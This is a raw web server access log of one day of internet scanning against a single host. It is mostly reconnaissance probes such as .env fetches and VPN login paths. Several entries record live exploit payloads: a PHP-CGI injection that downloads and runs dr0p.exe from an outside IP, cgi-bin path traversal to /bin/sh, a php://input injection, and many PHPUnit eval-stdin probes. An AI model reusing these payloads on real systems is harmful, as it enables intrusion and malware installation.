185.226.197.62 - - [07/Jan/2025:07:42:18 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
185.226.197.65 - - [07/Jan/2025:07:42:19 +0000] "GET /partymgr/control/main HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
185.226.197.65 - - [07/Jan/2025:07:42:19 +0000] "GET / HTTP/1.1" 200 947 "http://35.243.94.80/partymgr/control/main" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
185.226.197.63 - - [07/Jan/2025:07:42:48 +0000] "GET /index.jsp HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
185.226.197.63 - - [07/Jan/2025:07:42:48 +0000] "GET / HTTP/1.1" 200 947 "http://35.243.94.80/index.jsp" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
185.226.197.63 - - [07/Jan/2025:07:42:53 +0000] "GET /favicon-32x32.png HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
185.226.197.63 - - [07/Jan/2025:07:42:53 +0000] "GET / HTTP/1.1" 200 947 "http://35.243.94.80/favicon-32x32.png" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
61.85.80.95 - - [07/Jan/2025:08:05:17 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
65.49.1.28 - - [07/Jan/2025:08:07:12 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
65.49.1.34 - - [07/Jan/2025:08:09:30 +0000] "GET /favicon.ico HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0"
65.49.1.35 - - [07/Jan/2025:08:10:01 +0000] "GET /geoserver/web/ HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
92.118.39.244 - - [07/Jan/2025:08:14:26 +0000] "GET / HTTP/1.1" 200 966 "-" "POLARIS/6.01 (BREW 3.1.5; U; en-us; LG; LX265; POLARIS/6.01/WAP) MMP/2.0 profile/MIDP-2.1 Configuration/CLDC-1.1"
92.118.39.244 - - [07/Jan/2025:08:14:39 +0000] "GET /js/brand.js HTTP/1.1" 200 533 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3880.0 Safari/537.36"
92.118.39.244 - - [07/Jan/2025:08:14:39 +0000] "GET /js/login.js HTTP/1.1" 200 885 "-" "Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7"
92.118.39.244 - - [07/Jan/2025:08:14:39 +0000] "GET //unpkg.com/axios/dist/axios.min.js HTTP/1.1" 302 350 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Version/9.0 Mobile/13B143 Safari/601.1"
193.34.212.75 - - [07/Jan/2025:08:23:32 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
172.206.143.24 - - [07/Jan/2025:08:43:57 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 zgrab/0.x"
87.120.125.13 - - [07/Jan/2025:08:47:09 +0000] "GET /cgi-bin/php-cgi.exe?arg=%0aContent-Type:%20text/plain%0a%0a<?php%20system('curl%20-L%20-k%20-O%20http%3A%2F%2F23.27.51.244%2Fdr0p.exe%20%26%26%20.%2Fdr0p.exe%20%7C%7C%20wget%20--no-check-certificate%20http%3A%2F%2F23.27.51.244%2Fdr0p.exe%20%26%26%20.%2Fdr0p.exe');?> HTTP/1.1" 302 331 "-" "Go-http-client/1.1"
80.82.77.202 - - [07/Jan/2025:08:55:34 +0000] "\x16\x03\x02\x01o\x01" 400 527 "-" "-"
46.19.138.234 - - [07/Jan/2025:08:59:08 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
78.153.140.147 - - [07/Jan/2025:08:59:13 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.147 - - [07/Jan/2025:08:59:13 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
87.236.176.181 - - [07/Jan/2025:09:47:43 +0000] "GET / HTTP/1.1" 200 966 "-" "Mozilla/5.0 (compatible; InternetMeasurement/1.0; +https://internet-measurement.com/)"
104.152.52.127 - - [07/Jan/2025:09:56:07 +0000] "GET / HTTP/1.0" 200 1761 "-" "masscan/1.3 (https://github.com/robertdavidgraham/masscan)"
36.156.22.4 - - [07/Jan/2025:09:57:35 +0000] "GET / HTTP/1.0" 200 1761 "-" "-"
36.156.22.4 - - [07/Jan/2025:09:57:39 +0000] "GET /favicon.ico HTTP/1.1" 302 331 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
36.156.22.4 - - [07/Jan/2025:09:57:39 +0000] "GET / HTTP/1.1" 200 947 "http://35.243.94.80/favicon.ico" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
36.156.22.4 - - [07/Jan/2025:09:57:40 +0000] "GET /robots.txt HTTP/1.1" 302 331 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
36.156.22.4 - - [07/Jan/2025:09:57:40 +0000] "GET / HTTP/1.1" 200 947 "http://35.243.94.80/robots.txt" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
36.156.22.4 - - [07/Jan/2025:09:57:40 +0000] "GET /.well-known/security.txt HTTP/1.1" 302 331 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
36.156.22.4 - - [07/Jan/2025:09:57:40 +0000] "GET / HTTP/1.1" 200 947 "http://35.243.94.80/.well-known/security.txt" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
78.153.140.147 - - [07/Jan/2025:10:06:48 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.147 - - [07/Jan/2025:10:06:48 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
154.213.184.132 - - [07/Jan/2025:10:38:28 +0000] "CONNECT google.com:443 HTTP/1.1" 302 331 "-" "Go-http-client/1.1"
91.223.3.201 - - [07/Jan/2025:10:44:11 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
118.39.250.184 - - [07/Jan/2025:11:01:43 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
152.42.219.47 - - [07/Jan/2025:11:05:19 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
152.42.219.47 - - [07/Jan/2025:11:05:29 +0000] "\x16\x03\x01\x01\v\x01" 400 527 "-" "-"
193.34.212.75 - - [07/Jan/2025:11:09:45 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
118.44.189.122 - - [07/Jan/2025:11:30:54 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
119.206.173.135 - - [07/Jan/2025:11:38:27 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
87.120.112.187 - - [07/Jan/2025:11:53:32 +0000] "GET /.env HTTP/1.1" 302 350 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 12_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1"
91.223.3.201 - - [07/Jan/2025:12:01:29 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
119.203.218.178 - - [07/Jan/2025:12:33:46 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
121.141.36.92 - - [07/Jan/2025:12:42:24 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
78.153.140.147 - - [07/Jan/2025:12:42:42 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.147 - - [07/Jan/2025:12:42:43 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
45.156.129.135 - - [07/Jan/2025:12:59:06 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
78.153.140.147 - - [07/Jan/2025:13:02:57 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.147 - - [07/Jan/2025:13:02:58 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
13.91.164.9 - - [07/Jan/2025:13:16:59 +0000] "GET /druid/index.html HTTP/1.1" 302 331 "-" "Mozilla/5.0 zgrab/0.x"
185.16.39.104 - - [07/Jan/2025:13:18:04 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
139.59.101.104 - - [07/Jan/2025:13:20:01 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
43.166.134.47 - - [07/Jan/2025:13:46:48 +0000] "GET / HTTP/1.1" 200 966 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
179.43.191.146 - - [07/Jan/2025:13:48:49 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
137.184.154.164 - - [07/Jan/2025:13:50:30 +0000] "POST /wsman HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
137.184.154.164 - - [07/Jan/2025:13:50:31 +0000] "GET / HTTP/1.1" 200 966 "http://35.243.94.80:80/wsman" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
45.33.10.67 - - [07/Jan/2025:13:50:31 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
45.33.10.67 - - [07/Jan/2025:13:50:31 +0000] "GET /favicon.ico HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
45.33.10.67 - - [07/Jan/2025:13:50:31 +0000] "GET / HTTP/1.1" 200 889 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
137.184.152.207 - - [07/Jan/2025:13:50:33 +0000] "GET / HTTP/1.1" 200 966 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
97.107.139.11 - - [07/Jan/2025:13:50:35 +0000] "GET / HTTP/1.1" 200 966 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
97.107.139.11 - - [07/Jan/2025:13:50:35 +0000] "GET /auth1.html HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
97.107.139.11 - - [07/Jan/2025:13:50:35 +0000] "GET /auth.html HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
97.107.139.11 - - [07/Jan/2025:13:50:35 +0000] "GET /sslvpnLogin.html HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
97.107.139.11 - - [07/Jan/2025:13:50:35 +0000] "GET /api/sonicos/auth HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
97.107.139.11 - - [07/Jan/2025:13:50:35 +0000] "GET /api/sonicos/tfa HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
97.107.139.11 - - [07/Jan/2025:13:50:35 +0000] "GET / HTTP/1.1" 200 966 "http://35.243.94.80:80/auth1.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
97.107.139.11 - - [07/Jan/2025:13:50:35 +0000] "GET / HTTP/1.1" 200 966 "http://35.243.94.80:80/auth.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
97.107.139.11 - - [07/Jan/2025:13:50:35 +0000] "GET / HTTP/1.1" 200 966 "http://35.243.94.80:80/sslvpnLogin.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
97.107.139.11 - - [07/Jan/2025:13:50:35 +0000] "GET / HTTP/1.1" 200 966 "http://35.243.94.80:80/api/sonicos/tfa" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
97.107.139.11 - - [07/Jan/2025:13:50:35 +0000] "GET / HTTP/1.1" 200 966 "http://35.243.94.80:80/api/sonicos/auth" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
45.33.14.165 - - [07/Jan/2025:13:50:42 +0000] "GET / HTTP/1.1" 200 1742 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 Edg/109.0.1518.61"
45.33.10.67 - - [07/Jan/2025:13:51:58 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
45.33.10.67 - - [07/Jan/2025:13:51:58 +0000] "GET /js/brand.js HTTP/1.1" 200 569 "http://35.243.94.80/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
45.33.10.67 - - [07/Jan/2025:13:51:59 +0000] "GET /js/login.js HTTP/1.1" 200 922 "http://35.243.94.80/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
45.33.10.67 - - [07/Jan/2025:13:51:59 +0000] "GET /js/utils/json-manipulator.js HTTP/1.1" 200 564 "http://35.243.94.80/js/brand.js" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
45.33.10.67 - - [07/Jan/2025:13:51:59 +0000] "GET /js/services/LoggerService.js HTTP/1.1" 200 1344 "http://35.243.94.80/js/login.js" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
103.255.233.186 - - [07/Jan/2025:13:53:01 +0000] "GET / HTTP/1.1" 200 1742 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
45.79.252.121 - - [07/Jan/2025:14:07:15 +0000] "GET / HTTP/1.0" 200 1761 "-" "-"
45.79.252.121 - - [07/Jan/2025:14:07:17 +0000] "Gh0st\xad" 400 527 "-" "-"
45.79.252.121 - - [07/Jan/2025:14:07:21 +0000] "HELP" 400 527 "-" "-"
45.79.252.121 - - [07/Jan/2025:14:07:21 +0000] "\x1b\x84\xd5\xb0]\xf4\xc4\x93\xc50\xc2X\x8c\xda\xb1\xd7\xac\xafn\x1d\xe1\x1e\x1a3*\x85\xb7\x1d'\xb1\xc9k\xbf\xf0\xbc\n" 400 527 "-" "-"
45.79.252.121 - - [07/Jan/2025:14:07:23 +0000] "\x16\x03\x01" 400 527 "-" "-"
45.79.252.121 - - [07/Jan/2025:14:07:25 +0000] "\xbd\xff\x9e\xffE\xff\x9e\xff\xbd\xff\x9e\xff\xa4\xff\x86\xff\xc4\xff\xbe\xff\xc7\xff\xdb\xff\xee\xff\xd9\xff\xed\xff\xa4\xff\x9d\xff\xcf\xff\xd8\xff\xe5\xff\x04\xff\x12\xff0\xff\xb1\xff\xbd\xff\xe7\xff\xe2\xff\xdd\xff\xdc\xff\xde\xff\xc8\xff\xcc\xff\xbe\xff\xf8\xff&\xff\x01\xff\x0f\xff\xf5\xff\x06\xff\xff\xff\xf7\xff!\xff\xde\xff\x02\xff&\xff\x0c\xff\x01\xff\xf5\xff\n" 400 527 "-" "-"
134.122.27.76 - - [07/Jan/2025:14:07:51 +0000] "GET / HTTP/1.0" 200 1761 "-" "-"
193.34.212.75 - - [07/Jan/2025:14:11:15 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
195.3.223.55 - - [07/Jan/2025:14:18:37 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
46.19.138.234 - - [07/Jan/2025:14:42:01 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
78.153.140.147 - - [07/Jan/2025:14:43:39 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.147 - - [07/Jan/2025:14:43:39 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
89.248.165.236 - - [07/Jan/2025:14:45:27 +0000] "CONNECT api.ipify.org:443 HTTP/1.1" 302 331 "-" "Go-http-client/1.1"
222.141.79.229 - - [07/Jan/2025:14:52:54 +0000] "POST /HNAP1/ HTTP/1.0" 302 350 "-" "-"
195.3.223.55 - - [07/Jan/2025:15:22:29 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
78.153.140.147 - - [07/Jan/2025:15:26:42 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.147 - - [07/Jan/2025:15:26:43 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
121.185.82.145 - - [07/Jan/2025:15:39:09 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
121.160.156.71 - - [07/Jan/2025:15:52:31 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
139.59.101.104 - - [07/Jan/2025:16:13:09 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
91.223.3.201 - - [07/Jan/2025:16:26:01 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
103.226.248.206 - - [07/Jan/2025:16:35:13 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 400 486 "-" "Custom-AsyncHttpClient"
103.226.248.206 - - [07/Jan/2025:16:35:14 +0000] "POST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh HTTP/1.1" 400 486 "-" "Custom-AsyncHttpClient"
103.226.248.206 - - [07/Jan/2025:16:35:15 +0000] "POST /hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1" 302 387 "-" "Custom-AsyncHttpClient"
103.226.248.206 - - [07/Jan/2025:16:35:15 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
103.226.248.206 - - [07/Jan/2025:16:35:15 +0000] "GET /vendor/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
103.226.248.206 - - [07/Jan/2025:16:35:15 +0000] "GET /vendor/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
103.226.248.206 - - [07/Jan/2025:16:35:15 +0000] "GET /vendor/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
103.226.248.206 - - [07/Jan/2025:16:35:15 +0000] "GET /vendor/phpunit/phpunit/LICENSE/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
103.226.248.206 - - [07/Jan/2025:16:35:15 +0000] "GET /vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
103.226.248.206 - - [07/Jan/2025:16:35:16 +0000] "GET /phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
103.226.248.206 - - [07/Jan/2025:16:35:16 +0000] "GET /phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
103.226.248.206 - - [07/Jan/2025:16:35:16 +0000] "GET /phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
103.226.248.206 - - [07/Jan/2025:16:35:16 +0000] "GET /phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
103.226.248.206 - - [07/Jan/2025:16:35:16 +0000] "GET /lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
103.226.248.206 - - [07/Jan/2025:16:35:16 +0000] "GET /lib/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
103.226.248.206 - - [07/Jan/2025:16:35:16 +0000] "GET /lib/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
103.226.248.206 - - [07/Jan/2025:16:35:17 +0000] "GET /lib/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
103.226.248.206 - - [07/Jan/2025:16:35:17 +0000] "GET /lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
103.226.248.206 - - [07/Jan/2025:16:35:17 +0000] "GET /laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
103.226.248.206 - - [07/Jan/2025:16:35:17 +0000] "GET /www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
103.226.248.206 - - [07/Jan/2025:16:35:17 +0000] "GET /ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
103.226.248.206 - - [07/Jan/2025:16:35:18 +0000] "GET /yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
103.226.248.206 - - [07/Jan/2025:16:35:19 +0000] "GET /zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
103.226.248.206 - - [07/Jan/2025:16:35:19 +0000] "GET /ws/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
103.226.248.206 - - [07/Jan/2025:16:35:19 +0000] "GET /V2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
103.226.248.206 - - [07/Jan/2025:16:35:19 +0000] "GET /tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
103.226.248.206 - - [07/Jan/2025:16:35:19 +0000] "GET /test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
103.226.248.206 - - [07/Jan/2025:16:35:20 +0000] "GET /testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
103.226.248.206 - - [07/Jan/2025:16:35:20 +0000] "GET /api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
103.226.248.206 - - [07/Jan/2025:16:35:20 +0000] "GET /demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
